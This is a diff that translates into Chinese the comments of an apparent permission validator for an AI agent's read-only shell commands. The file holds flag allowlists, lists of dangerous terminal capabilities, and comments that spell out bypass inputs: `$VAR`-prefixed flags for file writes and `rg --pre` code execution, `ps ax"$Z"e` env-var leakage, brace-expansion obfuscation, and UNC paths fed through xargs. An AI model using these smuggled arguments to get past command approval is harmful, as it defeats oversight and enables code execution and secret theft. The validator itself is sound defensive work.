       '--file': 'string',
-      '-d': 'string', // --directory - search path
+      '-d': 'string', // --directory — 搜索路径
       '--directory': 'string',
-      '-n': 'string', // --node - specify node
+      '-n': 'string', // --node — 指定节点
       '--node': 'string',
       '-a': 'none', // --all
       '--all': 'none',
-      '-k': 'string', // --apropos - search
+      '-k': 'string', // --apropos — 搜索
       '--apropos': 'string',
-      '-w': 'none', // --where - show location
+      '-w': 'none', // --where — 显示位置
       '--where': 'none',
       '--location': 'none',
       '--show-options': 'none',
@@ -853,11 +853,11 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--usage': 'none',
       '--version': 'none',
     },
-    // Dangerous flags NOT included (blocked by omission):
-    // -o / --output - writes output to file
-    // --dribble - records keystrokes to file
-    // --init-file - loads custom config (potential code execution)
-    // --restore - replays keystrokes from file
+    // 未包含的危险标志（通过省略来阻止）：
+    // -o / --output — 将输出写入文件
+    // --dribble — 将按键记录写入文件
+    // --init-file — 加载自定义配置（潜在代码执行）
+    // --restore — 从文件回放按键记录
   },
 
   lsof: {
@@ -899,63 +899,63 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-k': 'string',
       '-p': 'string',
       '-u': 'string',
-      // OMITTED (writes to disk): -D (device cache file build/update)
+      // 已省略（写入磁盘）: -D（设备缓存文件构建/更新）
     },
-    // Block +m (create mount supplement file) — writes to disk.
-    // +prefix flags are treated as positional args by validateFlags,
-    // so we must catch them here. lsof accepts +m<path> (attached path, no space)
-    // with both absolute (+m/tmp/evil) and relative (+mfoo, +m.evil) paths.
+    // 阻止 +m（创建挂载补充文件）— 写入磁盘。
+    // +prefix 标志被 validateFlags 视为位置参数，
+    // 因此我们必须在此处捕获它们。lsof 接受 +m<路径>（附加路径，无空格）
+    // 包括绝对路径（+m/tmp/evil）和相对路径（+mfoo、+m.evil）。
     additionalCommandIsDangerousCallback: (_rawCommand, args) =>
       args.some(a => a === '+m' || a.startsWith('+m')),
   },
 
   pgrep: {
     safeFlags: {
-      '-d': 'string',
+      '-d': 'string', // 分隔符
       '--delimiter': 'string',
-      '-l': 'none',
+      '-l': 'none', // 列出名称
       '--list-name': 'none',
-      '-a': 'none',
+      '-a': 'none', // 列出完整命令行
       '--list-full': 'none',
-      '-v': 'none',
+      '-v': 'none', // 反向匹配
       '--inverse': 'none',
-      '-w': 'none',
+      '-w': 'none', // 轻量级输出
       '--lightweight': 'none',
-      '-c': 'none',
+      '-c': 'none', // 计数
       '--count': 'none',
-      '-f': 'none',
+      '-f': 'none', // 匹配完整命令行
       '--full': 'none',
-      '-g': 'string',
+      '-g': 'string', // 按进程组
       '--pgroup': 'string',
-      '-G': 'string',
+      '-G': 'string', // 按组名
       '--group': 'string',
-      '-i': 'none',
+      '-i': 'none', // 忽略大小写
       '--ignore-case': 'none',
-      '-n': 'none',
+      '-n': 'none', // 仅最新
       '--newest': 'none',
-      '-o': 'none',
+      '-o': 'none', // 仅最旧
       '--oldest': 'none',
-      '-O': 'string',
+      '-O': 'string', // 仅比指定秒数更旧的
       '--older': 'string',
-      '-P': 'string',
+      '-P': 'string', // 按父进程 ID
       '--parent': 'string',
-      '-s': 'string',
+      '-s': 'string', // 按会话 ID
       '--session': 'string',
-      '-t': 'string',
+      '-t': 'string', // 按终端
       '--terminal': 'string',
-      '-u': 'string',
+      '-u': 'string', // 按有效用户 ID
       '--euid': 'string',
-      '-U': 'string',
+      '-U': 'string', // 按用户 ID
       '--uid': 'string',
-      '-x': 'none',
+      '-x': 'none', // 精确匹配
       '--exact': 'none',
-      '-F': 'string',
+      '-F': 'string', // 从文件读取 PID
       '--pidfile': 'string',
-      '-L': 'none',
+      '-L': 'none', // 如果 PID 文件被锁定则失败
       '--logpidfile': 'none',
-      '-r': 'string',
+      '-r': 'string', // 按运行状态
       '--runstates': 'string',
-      '--ns': 'string',
+      '--ns': 'string', // 按命名空间
       '--nslist': 'string',
       '--help': 'none',
       '-V': 'none',
@@ -968,50 +968,50 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-T': 'string',
       '-V': 'none',
       '-x': 'none',
-      // SECURITY: -S (read capability names from stdin) deliberately EXCLUDED.
-      // It must NOT be in safeFlags because validateFlags unbundles combined
-      // short flags (e.g., -xS → -x + -S), but the callback receives the raw
-      // token '-xS' and only checks exact match 'token === "-S"'. Excluding -S
-      // from safeFlags ensures validateFlags rejects it (bundled or not) before
-      // the callback runs. The callback's -S check is defense-in-depth.
+      // 安全: -S（从标准输入读取能力名称）被故意排除。
+      // 它不得出现在 safeFlags 中，因为 validateFlags 会解包组合
+      // 短标志（例如 -xS → -x + -S），但回调收到原始令牌
+      // '-xS' 并仅检查精确匹配 'token === "-S"'。从 safeFlags 中
+      // 排除 -S 确保 validateFlags 在回调运行之前就拒绝它（无论是否打包）。
+      // 回调的 -S 检查是深度防御。
     },
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Capabilities that modify terminal state or could be harmful.
-      // init/reset run iprog (arbitrary code from terminfo) and modify tty settings.
-      // rs1/rs2/rs3/is1/is2/is3 are the individual reset/init sequences that
-      // init/reset invoke internally — rs1 sends ESC c (full terminal reset).
-      // clear erases scrollback (evidence destruction). mc5/mc5p activate media copy
-      // (redirect output to printer device). smcup/rmcup manipulate screen buffer.
-      // pfkey/pfloc/pfx/pfxl program function keys — pfloc executes strings locally.
-      // rf is reset file (analogous to if/init_file).
+      // 修改终端状态或可能有害的能力。
+      // init/reset 运行 iprog（来自 terminfo 的任意代码）并修改 tty 设置。
+      // rs1/rs2/rs3/is1/is2/is3 是 init/reset 内部调用的各个重置/初始化序列
+      // — rs1 发送 ESC c（完全终端重置）。
+      // clear 清除回滚缓冲区（证据销毁）。mc5/mc5p 激活媒体复制
+      // （将输出重定向到打印机设备）。smcup/rmcup 操作屏幕缓冲区。
+      // pfkey/pfloc/pfx/pfxl 编程功能键 — pfloc 在本地执行字符串。
+      // rf 是重置文件（类似于 if/init_file）。
       const DANGEROUS_CAPABILITIES = new Set([
-        'init',
-        'reset',
-        'rs1',
-        'rs2',
-        'rs3',
-        'is1',
-        'is2',
-        'is3',
-        'iprog',
-        'if',
-        'rf',
-        'clear',
-        'flash',
-        'mc0',
-        'mc4',
-        'mc5',
-        'mc5i',
-        'mc5p',
-        'pfkey',
-        'pfloc',
-        'pfx',
-        'pfxl',
-        'smcup',
-        'rmcup',
+        'init',  // 初始化终端（运行 iprog）
+        'reset', // 重置终端（运行 iprog）
+        'rs1',   // 重置序列 1
+        'rs2',   // 重置序列 2
+        'rs3',   // 重置序列 3
+        'is1',   // 初始化序列 1
+        'is2',   // 初始化序列 2
+        'is3',   // 初始化序列 3
+        'iprog', // 初始化程序（从 terminfo 执行任意代码）
+        'if',    // 初始化文件
+        'rf',    // 重置文件
+        'clear', // 清除屏幕（销毁回滚缓冲区）
+        'flash', // 终端闪烁
+        'mc0',   // 打印屏幕内容
+        'mc4',   // 关闭打印机
+        'mc5',   // 启用打印机
+        'mc5i',  // 启用打印机（透明）
+        'mc5p',  // 打开打印机页面
+        'pfkey', // 编程功能键
+        'pfloc', // 编程本地功能键（执行字符串）
+        'pfx',   // 编程功能键字符串
+        'pfxl',  // 编程功能键字符串（长）
+        'smcup', // 进入屏幕缓冲模式
+        'rmcup', // 退出屏幕缓冲模式
       ])
       const flagsWithArgs = new Set(['-T'])
       let i = 0
@@ -1022,9 +1022,9 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
           afterDoubleDash = true
           i++
         } else if (!afterDoubleDash && token.startsWith('-')) {
-          // Defense-in-depth: block -S even if it somehow passes validateFlags
+          // 深度防御: 即使 -S 以某种方式通过 validateFlags 也阻止它
           if (token === '-S') return true
-          // Also check for -S bundled with other flags (e.g., -xS)
+          // 同时检查 -S 与其他标志打包（例如 -xS）
           if (
             !token.startsWith('--') &&
             token.length > 2 &&
@@ -1045,104 +1045,104 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
     },
   },
 
-  // ss — socket statistics (iproute2). Read-only query tool equivalent to netstat.
-  // SECURITY: -K/--kill (forcibly close sockets) and -D/--diag (dump raw data to file)
-  // are deliberately excluded. -F/--filter (read filter from file) also excluded.
+  // ss — 套接字统计（iproute2）。等效于 netstat 的只读查询工具。
+  // 安全: -K/--kill（强制关闭套接字）和 -D/--diag（将原始数据转储到文件）
+  // 被故意排除。-F/--filter（从文件读取过滤器）也已排除。
   ss: {
     safeFlags: {
-      '-h': 'none',
+      '-h': 'none', // 帮助
       '--help': 'none',
-      '-V': 'none',
+      '-V': 'none', // 版本
       '--version': 'none',
-      '-n': 'none',
+      '-n': 'none', // 数字显示
       '--numeric': 'none',
-      '-r': 'none',
+      '-r': 'none', // 解析主机名
       '--resolve': 'none',
-      '-a': 'none',
+      '-a': 'none', // 所有套接字
       '--all': 'none',
-      '-l': 'none',
+      '-l': 'none', // 仅监听套接字
       '--listening': 'none',
-      '-o': 'none',
+      '-o': 'none', // 显示选项
       '--options': 'none',
-      '-e': 'none',
+      '-e': 'none', // 扩展信息
       '--extended': 'none',
-      '-m': 'none',
+      '-m': 'none', // 内存使用
       '--memory': 'none',
-      '-p': 'none',
+      '-p': 'none', // 显示进程
       '--processes': 'none',
-      '-i': 'none',
+      '-i': 'none', // 内部信息
       '--info': 'none',
-      '-s': 'none',
+      '-s': 'none', // 汇总
       '--summary': 'none',
-      '-4': 'none',
+      '-4': 'none', // IPv4
       '--ipv4': 'none',
-      '-6': 'none',
+      '-6': 'none', // IPv6
       '--ipv6': 'none',
-      '-0': 'none',
+      '-0': 'none', // 数据包套接字
       '--packet': 'none',
-      '-t': 'none',
+      '-t': 'none', // TCP
       '--tcp': 'none',
-      '-M': 'none',
+      '-M': 'none', // MPTCP
       '--mptcp': 'none',
-      '-S': 'none',
+      '-S': 'none', // SCTP
       '--sctp': 'none',
-      '-u': 'none',
+      '-u': 'none', // UDP
       '--udp': 'none',
-      '-d': 'none',
+      '-d': 'none', // DCCP
       '--dccp': 'none',
-      '-w': 'none',
+      '-w': 'none', // 原始套接字
       '--raw': 'none',
-      '-x': 'none',
+      '-x': 'none', // Unix 套接字
       '--unix': 'none',
-      '--tipc': 'none',
-      '--vsock': 'none',
-      '-f': 'string',
+      '--tipc': 'none', // TIPC
+      '--vsock': 'none', // VM 套接字
+      '-f': 'string', // 地址族
       '--family': 'string',
-      '-A': 'string',
+      '-A': 'string', // 套接字查询
       '--query': 'string',
       '--socket': 'string',
-      '-Z': 'none',
+      '-Z': 'none', // 安全上下文
       '--context': 'none',
-      '-z': 'none',
+      '-z': 'none', // 安全上下文（显示）
       '--contexts': 'none',
-      // SECURITY: -N/--net EXCLUDED — performs setns(), unshare(), mount(), umount()
-      // to switch network namespace. While isolated to forked process, too invasive.
-      '-b': 'none',
+      // 安全: -N/--net 已排除 — 执行 setns()、unshare()、mount()、umount()
+      // 以切换网络命名空间。虽然隔离到 fork 进程，但仍过于侵入。
+      '-b': 'none', // BPF 过滤器信息
       '--bpf': 'none',
-      '-E': 'none',
+      '-E': 'none', // 事件
       '--events': 'none',
-      '-H': 'none',
+      '-H': 'none', // 无头部
       '--no-header': 'none',
-      '-O': 'none',
+      '-O': 'none', // 单行
       '--oneline': 'none',
-      '--tipcinfo': 'none',
-      '--tos': 'none',
-      '--cgroup': 'none',
-      '--inet-sockopt': 'none',
-      // SECURITY: -K/--kill EXCLUDED — forcibly closes sockets
-      // SECURITY: -D/--diag EXCLUDED — dumps raw TCP data to a file
-      // SECURITY: -F/--filter EXCLUDED — reads filter expressions from a file
+      '--tipcinfo': 'none', // TIPC 信息
+      '--tos': 'none', // TOS 信息
+      '--cgroup': 'none', // cgroup 信息
+      '--inet-sockopt': 'none', // 套接字选项
+      // 安全: -K/--kill 已排除 — 强制关闭套接字
+      // 安全: -D/--diag 已排除 — 将原始 TCP 数据转储到文件
+      // 安全: -F/--filter 已排除 — 从文件读取过滤器表达式
     },
   },
 
-  // fd/fdfind — fast file finder (fd-find). Read-only search tool.
-  // SECURITY: -x/--exec (execute command per result) and -X/--exec-batch
-  // (execute command with all results) are deliberately excluded.
+  // fd/fdfind — 快速文件查找工具 (fd-find)。只读搜索工具。
+  // 安全: -x/--exec（对每个结果执行命令）和 -X/--exec-batch
+  // （对所有结果执行命令）已被有意排除。
   fd: { safeFlags: { ...FD_SAFE_FLAGS } },
-  // fdfind is the Debian/Ubuntu package name for fd — same binary, same flags
+  // fdfind 是 Debian/Ubuntu 上 fd 的包名称 — 同一二进制，相同标志
   fdfind: { safeFlags: { ...FD_SAFE_FLAGS } },
 
   ...PYRIGHT_READ_ONLY_COMMANDS,
   ...DOCKER_READ_ONLY_COMMANDS,
 }
 
-// gh commands are ant-only since they make network requests, which goes against
-// the read-only validation principle of no network access
+// gh 命令仅限 ant 用户，因为它们会发起网络请求，
+// 这与只读验证的"无网络访问"原则相悖
 const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
-  // All gh read-only commands from shared validation map
+  // 来自共享验证映射的所有 gh 只读命令
   ...GH_READ_ONLY_COMMANDS,
-  // aki — Anthropic internal knowledge-base search CLI.
-  // Network read-only (same policy as gh). --audit-csv omitted: writes to disk.
+  // aki — Anthropic 内部知识库搜索 CLI。
+  // 网络只读（与 gh 相同策略）。--audit-csv 已排除：写入磁盘。
   aki: {
     safeFlags: {
       '-h': 'none',
@@ -1200,10 +1200,10 @@ const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
 
 function getCommandAllowlist(): Record<string, CommandConfig> {
   let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
-  // On Windows, xargs can be used as a data-to-code bridge: if a file contains
-  // a UNC path, `cat file | xargs cat` feeds that path to cat, triggering SMB
-  // resolution. Since the UNC path is in file contents (not the command string),
-  // regex-based detection cannot catch this.
+  // 在 Windows 上，xargs 可被用作数据到代码的桥梁：如果文件包含
+  // UNC 路径，`cat file | xargs cat` 会将路径传给 cat，触发 SMB
+  // 解析。由于 UNC 路径在文件内容中（而非命令字符串中），
+  // 基于正则的检测无法捕捉此问题。
   if (getPlatform() === 'windows') {
     const { xargs: _, ...rest } = allowlist
     allowlist = rest
@@ -1215,38 +1215,36 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
 }
 
 /**
- * Commands that are safe to use as xargs targets for auto-approval.
+ * 可安全用作 xargs 目标以自动批准的命令列表。
  *
- * SECURITY: Only add a command to this list if it has NO flags that can:
- * 1. Write to files (e.g., find's -fprint, sed's -i)
- * 2. Execute code (e.g., find's -exec, awk's system(), perl's -e)
- * 3. Make network requests
+ * 安全：仅当命令没有任何可能以下操作的标志时，才可添加到此列表：
+ * 1. 写入文件（例如 find 的 -fprint、sed 的 -i）
+ * 2. 执行代码（例如 find 的 -exec、awk 的 system()、perl 的 -e）
+ * 3. 发起网络请求
  *
- * These commands must be purely read-only utilities. When xargs uses one of
- * these as a target, we stop validating flags after the target command
- * (see the `break` in isCommandSafeViaFlagParsing), so the command itself
- * must not have ANY dangerous flags, not just a safe subset.
+ * 这些命令必须是纯只读工具。当 xargs 使用其中某个命令作为目标时，
+ * 我们在目标命令之后停止验证标志（参见 isCommandSafeViaFlagParsing 中的 `break`），
+ * 因此命令本身不得有任何危险标志，而不仅仅是一个安全的子集。
  *
- * Each command was verified by checking its man page for dangerous capabilities.
+ * 每个命令都通过检查其手册页以确认没有危险能力。
  */
 const SAFE_TARGET_COMMANDS_FOR_XARGS = [
-  'echo', // Output only, no dangerous flags
-  'printf', // xargs runs /usr/bin/printf (binary), not bash builtin — no -v support
-  'wc', // Read-only counting, no dangerous flags
-  'grep', // Read-only search, no dangerous flags
-  'head', // Read-only, no dangerous flags
-  'tail', // Read-only (including -f follow), no dangerous flags
+  'echo', // 仅输出，无危险标志
+  'printf', // xargs 运行 /usr/bin/printf（二进制），而非 bash 内置 — 不支持 -v
+  'wc', // 只读计数，无危险标志
+  'grep', // 只读搜索，无危险标志
+  'head', // 只读，无危险标志
+  'tail', // 只读（包括 -f 跟踪），无危险标志
 ]
 
 /**
- * Unified command validation function that replaces individual validator functions.
- * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
- * Handles combined flags, argument validation, and shell quoting bypass detection.
+ * 统一的命令验证函数，替代各个独立的验证函数。
+ * 使用 COMMAND_ALLOWLIST 的声明式配置来验证命令及其标志。
+ * 处理组合标志、参数验证以及 shell 引号绕过检测。
  */
 export function isCommandSafeViaFlagParsing(command: string): boolean {
-  // Parse the command to get individual tokens using shell-quote for accuracy
-  // Handle glob operators by converting them to strings, they don't matter from the perspective
-  // of this function
+  // 解析命令，使用 shell-quote 获取各个令牌以确保准确性
+  // 处理通配符操作符，将其转换为字符串；从本函数的角度来看它们无关紧要
   const parseResult = tryParseShellCommand(command, env => `$${env}`)
   if (!parseResult.success) return false
 
@@ -1260,9 +1258,9 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
     return token
   })
 
-  // If there are operators (pipes, redirects, etc.), it's not a simple command.
-  // Breaking commands down into their constituent parts is handled upstream of
-  // this function, so we reject anything with operators here.
+  // 如果有操作符（管道、重定向等），则不是简单命令。
+  // 将命令分解为组成部分的操作在本函数的上游处理，
+  // 因此我们在此拒绝任何带有操作符的命令。
   const hasOperators = parsed.some(token => typeof token !== 'string')
   if (hasOperators) {
     return false
@@ -1279,7 +1277,7 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   let commandConfig: CommandConfig | undefined
   let commandTokens: number = 0
 
-  // Check for multi-word commands first (e.g., "git diff", "git stash list")
+  // 首先检查多词命令（例如 "git diff"、"git stash list"）
   const allowlist = getCommandAllowlist()
   for (const [cmdPattern] of Object.entries(allowlist)) {
     const cmdTokens = cmdPattern.split(' ')
@@ -1300,24 +1298,24 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   }
 
   if (!commandConfig) {
-    return false // Command not in allowlist
+    return false // 命令不在允许列表中
   }
 
-  // Special handling for git ls-remote to reject URLs that could lead to data exfiltration
+  // 对 git ls-remote 进行特殊处理，拒绝可能导致数据泄露的 URL
   if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
-    // Check if any argument looks like a URL or remote specification
+    // 检查是否有任何参数看起来像 URL 或远程仓库规范
     for (let i = 2; i < tokens.length; i++) {
       const token = tokens[i]
       if (token && !token.startsWith('-')) {
-        // Reject HTTP/HTTPS URLs
+        // 拒绝 HTTP/HTTPS URL
         if (token.includes('://')) {
           return false
         }
-        // Reject SSH URLs like git@github.com:user/repo.git
+        // 拒绝 SSH URL，如 git@github.com:user/repo.git
         if (token.includes('@') || token.includes(':')) {
           return false
         }
-        // Reject variable references
+        // 拒绝变量引用
         if (token.includes('$')) {
           return false
         }
@@ -1325,50 +1323,49 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
     }
   }
 
-  // SECURITY: Reject ANY token containing `$` (variable expansion). The
-  // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
-  // in tokens, but bash expands it at runtime (unset vars → empty string).
-  // This parser differential defeats BOTH validateFlags and callbacks:
+  // 安全：拒绝任何包含 `$`（变量展开）的令牌。在解析时
+  // `env => \`$${env}\`` 回调将 `$VAR` 保留为令牌中的字面文本，
+  // 但 bash 在运行时将其展开（未设置变量 → 空字符串）。
+  // 这种解析器差异同时绕过了 validateFlags 和回调：
   //
-  //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
-  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
-  //       (starts with `$`) falls through as positional at ~:1730. Bash runs
-  //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
+  //   (1) `$VAR` 前缀绕过 validateFlags 的 `startsWith('-')` 检查：
+  //       `git diff "$Z--output=/tmp/pwned"` → 令牌 `$Z--output=/tmp/pwned`
+  //       （以 `$` 开头）作为位置参数穿透。Bash 执行
+  //       `git diff --output=/tmp/pwned`。任意文件写入，零权限。
   //
-  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
-  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
-  //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
+  //   (2) `$VAR` 前缀 → 通过 `rg --pre` 实现 RCE：
+  //       `rg . "$Z--pre=bash" FILE` → 执行 `bash FILE`。rg 的配置中
+  //       没有正则表达式也没有回调。单步任意代码执行。
   //
-  //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
-  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
-  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
-  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
-  //       tokens would NOT close this.
+  //   (3) `$VAR` 中缀绕过 additionalCommandIsDangerousCallback 正则：
+  //       `ps ax"$Z"e` → 令牌 `ax$Ze`。ps 回调正则表达式
+  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` 在 `$` 上失败 → "不危险"。Bash 执行
+  //       `ps axe` → 所有进程的环境变量。仅修复 `$` 前缀令牌无法堵住此漏洞。
   //
-  // We check ALL tokens after the command prefix. Any `$` means we cannot
-  // determine the runtime token value, so we cannot verify read-only safety.
-  // This check must run BEFORE validateFlags and BEFORE callbacks.
+  // 我们检查命令前缀之后的所有令牌。任何 `$` 都意味着我们无法
+  // 确定运行时令牌值，因此无法验证只读安全性。
+  // 此检查必须在 validateFlags 和回调之前运行。
   for (let i = commandTokens; i < tokens.length; i++) {
     const token = tokens[i]
     if (!token) continue
-    // Reject any token containing $ (variable expansion)
+    // 拒绝任何包含 $（变量展开）的令牌
     if (token.includes('$')) {
       return false
     }
-    // Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
-    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote strips quotes
-    // → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
-    // This is defense-in-depth with validateBraceExpansion in bashSecurity.ts.
-    // We require BOTH `{` and `,` to avoid false positives on legitimate
-    // patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
-    // template, no `,`), `prefix-{}-suffix` (xargs, no `,`). Sequence form
-    // `{1..5}` also needs checking (has `{` + `..`).
+    // 拒绝同时包含 `{` 和 `,` 的令牌（花括号展开混淆）。
+    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote 去除引号
+    // → 令牌 `{@{0},--output=/tmp/pwned}` 包含 `{` + `,` → 花括号展开。
+    // 这与 bashSecurity.ts 中的 validateBraceExpansion 构成深度防御。
+    // 我们要求同时存在 `{` 和 `,` 以避免对合法模式的误报：
+    // `stash@{0}`（git 引用，有 `{` 无 `,`），`{{.State}}`（Go
+    // 模板，无 `,`），`prefix-{}-suffix`（xargs，无 `,`）。序列形式
+    // `{1..5}` 也需要检查（有 `{` + `..`）。
     if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
       return false
     }
   }
 
-  // Validate flags starting after the command tokens
+  // 从命令令牌之后开始验证标志
   if (
     !validateFlags(tokens, commandTokens, commandConfig, {
       commandName: tokens[0],
@@ -1386,7 +1383,7 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   if (!commandConfig.regex && /`/.test(command)) {
     return false
   }
-  // Block newlines and carriage returns in grep/rg patterns as they can be used for injection
+  // 阻止 grep/rg 模式中的换行符和回车符，它们可能被用于注入
   if (
     !commandConfig.regex &&
     (tokens[0] === 'rg' || tokens[0] === 'grep') &&
@@ -1408,38 +1405,38 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
 }
 
 /**
- * Creates a regex pattern that matches safe invocations of a command.
+ * 创建匹配命令安全调用的正则表达式模式。
  *
- * The regex ensures commands are invoked safely by blocking:
- * - Shell metacharacters that could lead to command injection or redirection
- * - Command substitution via backticks or $()
- * - Variable expansion that could contain malicious payloads
- * - Environment variable assignment bypasses (command=value)
+ * 该正则通过阻止以下内容确保命令被安全调用：
+ * - 可能导致命令注入或重定向的 shell 元字符
+ * - 通过反引号或 $() 进行的命令替换
+ * - 可能包含恶意载荷的变量展开
+ * - 环境变量赋值绕过 (command=value)
  *
- * @param command The command name (e.g., 'date', 'npm list', 'ip addr')
- * @returns RegExp that matches safe invocations of the command
+ * @param command 命令名称（例如 'date'、'npm list'、'ip addr'）
+ * @returns 匹配命令安全调用的 RegExp
  */
 function makeRegexForSafeCommand(command: string): RegExp {
-  // Create regex pattern: /^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
+  // 创建正则模式：/^command(?:\s|$)[^<>()$`|{}&;\n\r]*$/
   return new RegExp(`^${command}(?:\\s|$)[^<>()$\`|{}&;\\n\\r]*$`)
 }
 
-// Simple commands that are safe for execution (converted to regex patterns using makeRegexForSafeCommand)
-// WARNING: If you are adding new commands here, be very careful to ensure
-// they are truly safe. This includes ensuring:
-// 1. That they don't have any flags that allow file writing or command execution
-// 2. Use makeRegexForSafeCommand() to ensure proper regex pattern creation
+// 可安全执行的简单命令（使用 makeRegexForSafeCommand 转换为正则模式）
+// 警告：如果你要在此处添加新命令，请非常小心以确保
+// 它们真正安全。这包括确保：
+// 1. 它们没有任何允许文件写入或命令执行的标志
+// 2. 使用 makeRegexForSafeCommand() 确保正确的正则模式创建
 const READONLY_COMMANDS = [
-  // Cross-platform commands from shared validation
+  // 来自共享验证的跨平台命令
   ...EXTERNAL_READONLY_COMMANDS,
 
-  // Unix/bash-specific read-only commands (not shared because they don't exist in PowerShell)
+  // Unix/bash 特定只读命令（未共享是因为它们在 PowerShell 中不存在）
 
-  // Time and date
+  // 时间和日期
   'cal',
   'uptime',
 
-  // File content viewing (relative paths handled separately)
+  // 文件内容查看（相对路径单独处理）
   'cat',
   'head',
   'tail',
@@ -1450,7 +1447,7 @@ const READONLY_COMMANDS = [
   'od',
   'nl',
 
-  // System info
+  // 系统信息
   'id',
   'uname',
   'free',
@@ -1460,145 +1457,142 @@ const READONLY_COMMANDS = [
   'groups',
   'nproc',
 
-  // Path information
+  // 路径信息
   'basename',
   'dirname',
   'realpath',
 
-  // Text processing
+  // 文本处理
   'cut',
   'paste',
   'tr',
   'column',
-  'tac', // Reverse cat — displays file contents in reverse line order
-  'rev', // Reverse characters in each line
-  'fold', // Wrap lines to specified width
-  'expand', // Convert tabs to spaces
-  'unexpand', // Convert spaces to tabs
-  'fmt', // Simple text formatter — output to stdout only
-  'comm', // Compare sorted files line by line
-  'cmp', // Byte-by-byte file comparison
-  'numfmt', // Number format conversion
+  'tac', // 反向 cat — 以反向行顺序显示文件内容
+  'rev', // 反转每行中的字符
+  'fold', // 将行折行为指定宽度
+  'expand', // 将制表符转换为空格
+  'unexpand', // 将空格转换为制表符
+  'fmt', // 简单文本格式化程序 — 仅输出到 stdout
+  'comm', // 逐行比较已排序的文件
+  'cmp', // 逐字节比较文件
+  'numfmt', // 数字格式转换
 
-  // Path information (additional)
-  'readlink', // Resolve symlinks — displays target of symbolic link
+  // 路径信息（附加）
+  'readlink', // 解析符号链接 — 显示符号链接的目标
 
-  // File comparison
+  // 文件比较
   'diff',
 
-  // true and false, used to silence or create errors
+  // true 和 false，用于静默或创建错误
   'true',
   'false',
 
-  // Misc. safe commands
+  // 其他安全命令
   'sleep',
   'which',
   'type',
-  'expr', // Evaluate expressions (arithmetic, string matching)
-  'test', // Conditional evaluation (file checks, comparisons)
-  'getconf', // Get system configuration values
-  'seq', // Generate number sequences
-  'tsort', // Topological sort
-  'pr', // Paginate files for printing
+  'expr', // 计算表达式（算术、字符串匹配）
+  'test', // 条件求值（文件检查、比较）
+  'getconf', // 获取系统配置值
+  'seq', // 生成数字序列
+  'tsort', // 拓扑排序
+  'pr', // 分页文件以便打印
 ]
 
-// Complex commands that require custom regex patterns
-// Warning: If possible, avoid adding new regexes here and prefer using COMMAND_ALLOWLIST
-// instead. This allowlist-based approach to CLI flags is more secure and avoids
-// vulns coming from gnu getopt_long.
+// 需要自定义正则表达式的复杂命令
+// 警告：如有可能，避免在此处添加新正则表达式，优先使用 COMMAND_ALLOWLIST。
+// 这种基于允许列表的 CLI 标志方法更安全，可避免来自 GNU getopt_long 的漏洞。
 const READONLY_COMMAND_REGEXES = new Set([
-  // Convert simple commands to regex patterns using makeRegexForSafeCommand
+  // 使用 makeRegexForSafeCommand 将简单命令转换为正则模式
   ...READONLY_COMMANDS.map(makeRegexForSafeCommand),
 
-  // Echo that doesn't execute commands or use variables
-  // Allow newlines in single quotes (safe) but not in double quotes (could be dangerous with variable expansion)
-  // Also allow optional 2>&1 stderr redirection at the end
+  // 不执行命令或使用变量的 echo
+  // 允许单引号中的换行符（安全），但不允许双引号中的换行符（可能因变量展开而危险）
+  // 同时允许末尾的可选 2>&1 stderr 重定向
   /^echo(?:\s+(?:'[^']*'|"[^"$<>\n\r]*"|[^|;&`$(){}><#\\!"'\s]+))*(?:\s+2>&1)?\s*$/,
 
-  // Claude CLI help
+  // Claude CLI 帮助
   /^claude -h$/,
   /^claude --help$/,
 
-  // Git readonly commands are now handled via COMMAND_ALLOWLIST with explicit flag validation
+  // Git 只读命令现在通过 COMMAND_ALLOWLIST 进行显式标志验证处理
   // (git status, git blame, git ls-files, git config --get, git remote, git tag, git branch)
 
-  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // Only allow flags, no input/output files
+  /^uniq(?:\s+(?:-[a-zA-Z]+|--[a-zA-Z-]+(?:=\S+)?|-[fsw]\s+\d+))*(?:\s|$)\s*$/, // 仅允许标志，不允许输入/输出文件
 
-  // System info
+  // 系统信息
   /^pwd$/,
   /^whoami$/,
